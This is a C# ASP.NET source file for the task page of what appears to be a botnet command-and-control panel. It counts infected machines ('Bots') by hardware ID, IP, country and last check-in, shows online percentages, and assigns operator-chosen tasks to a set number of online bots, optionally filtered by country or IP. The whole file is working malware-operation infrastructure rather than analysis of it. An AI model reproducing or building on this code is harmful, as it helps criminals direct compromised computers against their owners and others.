using System;
using System.Data;
using System.Data.SqlClient;
using System.Web.UI.WebControls;

public partial class Tasks : System.Web.UI.Page
{
    private int amount = 0;
    private string Task;
    private string where;
    private string[] Bots;

    protected void Page_Load(object sender, EventArgs e)
    {
        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            int onnlineNow;
            int connToday;
            int connWeek;
            int connMonth;
            int connTotal;

            double connTodayPre;
            double connWeekPre;
            double connMonthPre;
            double connNowPre;

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots;", conn))
            {
                connTotal = (int)cmd.ExecuteScalar();
                lblConnectionsTotal.Text = connTotal.ToString();
                lblTotalBots.Text = connTotal.ToString();
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())));", conn))
            {
                onnlineNow = (int)cmd.ExecuteScalar();
                lblOnnlineNow.Text = onnlineNow.ToString();
                connNowPre = Math.Round((double)(100 * onnlineNow) / connTotal, 1);
                onlineNowPrec.Text = "data-percent=\"" + connNowPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -1, GETDATE())));", conn))
            {
                connToday = (int)cmd.ExecuteScalar();
                lblConnectionsToday.Text = connToday.ToString();
                connTodayPre = Math.Round((double)(100 * connToday) / connTotal, 1);
                connTodayPrec.Text = "data-percent=\"" + connTodayPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -7, GETDATE())));", conn))
            {
                connWeek = (int)cmd.ExecuteScalar();
                lblConnectionsWeek.Text = connWeek.ToString();
                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal, 1);
                connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -30, GETDATE())));", conn))
            {
                connMonth = (int)cmd.ExecuteScalar();
                lblConnectionsMonth.Text = connMonth.ToString();
                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";
            }
            fillgrid();
        }
    }

    protected void grdTask_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        foreach (TableCell tc in e.Row.Cells)
        {
            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
        }
    }

    protected void btnSubmit_Click(object sender, EventArgs e)
    {
        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            Task = ddTask.SelectedValue;
            where = txtFilter.Text;
            int Available;

            if (ddTask.SelectedValue == "0")
            {
                lblError.Text = "Please enter a task";
            }
            else if (txtAmount.Text == "" || txtAmount.Text == null)
            {
                lblError.Text = "Please enter how many bots";
            }
            else
            {
                amount = Convert.ToInt32(txtAmount.Text);
                lblError.Text = "";
            }

            if (where != null && where != "")
            {
                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where", conn))
                {
                    cmd.Parameters.AddWithValue("False", "False");
                    cmd.Parameters.AddWithValue("Where", where);
                    Available = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }
                if (Available >= amount)
                {
                    Bots = new string[amount + 1];
                    for (int i = 1; i <= amount; i++)
                    {
                        using (SqlCommand cmd = new SqlCommand("select distinct HWID from (select HWID, DENSE_RANK() over (order by CTask) as rownum from bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where) as tbl where tbl.rownum = @i ", conn))
                        {
                            cmd.Parameters.AddWithValue("False", "False");
                            cmd.Parameters.AddWithValue("Where", where);
                            cmd.Parameters.AddWithValue("i", i);
                            Bots[i] = (string)cmd.ExecuteScalar();
                            cmd.Parameters.Clear();
                        }
                    }
                    RegisterBots();
                }
                else if (Available == 0)
                {
                    lblError.Text = "The filter you entered had no returns";
                }
                else
                {
                    lblError.Text = "You don't have that many bots";
                }
            }
            else
            {
                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())))", conn))
                {
                    cmd.Parameters.AddWithValue("False", "False");
                    Available = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }
                if (Available >= amount)
                {
                    Bots = new string[amount + 1];
                    for (int i = 1; i <= amount; i++)
                    {
                        using (SqlCommand cmd = new SqlCommand("select distinct HWID from (select HWID, DENSE_RANK() over (order by CTask) as rownum from bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())))) as tbl where tbl.rownum = @i", conn))
                        {
                            cmd.Parameters.AddWithValue("False", "False");
                            cmd.Parameters.AddWithValue("i", i);
                            Bots[i] = (string)cmd.ExecuteScalar();
                            cmd.Parameters.Clear();
                        }
                    }
                    RegisterBots();
                }
                else
                {
                    lblError.Text = "You don't have that many bots";
                }
            }
        }
    }

    private void RegisterBots()
    {
        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            int CTask = 0;
            int TaskID = 0;

            using (SqlCommand cmd = new SqlCommand("SELECT TaskID FROM Tasks ORDER BY TaskID DESC;", conn))
            {
                TaskID = Convert.ToInt32(cmd.ExecuteScalar());
                TaskID++;
            }
            for (int i = 1; i <= amount; i++)
            {
                using (SqlCommand cmd = new SqlCommand("INSERT INTO Tasks VALUES (@TaskID,@UserID, @Type, @Parameter1, @Parameter2, @Parameter3, @Parameter4, @Max, @Ran, @Filter, @Status, @HWID)", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    cmd.Parameters.AddWithValue("UserID", "15");
                    cmd.Parameters.AddWithValue("Type", ddTask.SelectedValue);
                    cmd.Parameters.AddWithValue("Parameter1", "");
                    cmd.Parameters.AddWithValue("Parameter2", "");
                    cmd.Parameters.AddWithValue("Parameter3", "");
                    cmd.Parameters.AddWithValue("Parameter4", "");
                    cmd.Parameters.AddWithValue("Max", amount);
                    cmd.Parameters.AddWithValue("Ran", amount);
                    cmd.Parameters.AddWithValue("Filter", where);
                    cmd.Parameters.AddWithValue("Status", "Enabled");
                    cmd.Parameters.AddWithValue("HWID", Bots[i]);
                    cmd.ExecuteNonQuery();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT CTask FROM bots WHERE HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Bots[i]);
                    CTask = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("UPDATE Bots SET CTask = @CTask WHERE HWID = @HWID", conn))
                {
                    CTask++;
                    cmd.Parameters.AddWithValue("HWID", Bots[i]);
                    cmd.Parameters.AddWithValue("CTask", CTask);
                    cmd.ExecuteNonQuery();
                    cmd.Parameters.Clear();
                }
            }
            Response.Redirect(Request.RawUrl);
        }
    }

    protected void grdTask_RowDeleting(object sender, GridViewDeleteEventArgs e)
    {
        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            try
            {
                string TaskID = ((Label)grdTask.Rows[e.RowIndex].FindControl("lblTaskID")).Text;
                int amount;
                int amountBots;
                int CTask;

                using (SqlCommand cmd = new SqlCommand("SELECT Count(distinct HWID) FROM Tasks WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    amountBots = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                string[] BotHWID = new string[amountBots + 1];

                for (int i = 1; i <= amountBots; i++)
                {
                    using (SqlCommand cmd = new SqlCommand("select HWID from (SELECT HWID, DENSE_RANK() over (order by HWID) as rownum from Tasks where TaskID = @TaskID group by HWID) as tbl where tbl.rownum = @i", conn))
                    {
                        cmd.Parameters.AddWithValue("TaskID", TaskID);
                        cmd.Parameters.AddWithValue("i", i);
                        BotHWID[i] = (string)cmd.ExecuteScalar();
                        cmd.Parameters.Clear();
                    }

                    using (SqlCommand cmd = new SqlCommand("SELECT CTask FROM bots WHERE HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", BotHWID[i]);
                        amount = (int)cmd.ExecuteScalar();
                        cmd.Parameters.Clear();
                    }

                    using (SqlCommand cmd = new SqlCommand("UPDATE Bots SET CTask = @CTask WHERE HWID = @HWID", conn))
                    {
                        CTask = amount - 1;
                        cmd.Parameters.AddWithValue("HWID", BotHWID[i]);
                        cmd.Parameters.AddWithValue("CTask", CTask);
                        cmd.ExecuteNonQuery();
                        cmd.Parameters.Clear();
                    }
                }

                using (SqlCommand cmd = new SqlCommand("DELETE FROM Tasks WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    cmd.ExecuteNonQuery();
                    cmd.Parameters.Clear();
                }
                Response.Redirect(Request.RawUrl);
            }
            catch
            {
                Response.Redirect(Request.RawUrl);
            }
        }
    }

    public void fillgrid()
    {
        using (SqlConnection Conn = new SqlConnection(Settings.sqlConn))
        {
            Conn.Open();
            using (SqlCommand cmd = new SqlCommand("select distinct TaskID, Type, Parameter1, Parameter2, Parameter3, Parameter4, Max, Ran, Filter, Status from Tasks", Conn))
            {
                cmd.Parameters.AddWithValue("Enabled", "Enabled");
                DataSet ds = new DataSet();
                SqlDataReader reader = cmd.ExecuteReader();
                grdTask.DataSource = reader;
                grdTask.DataBind();
                reader.Close();
            }
        }
    }
}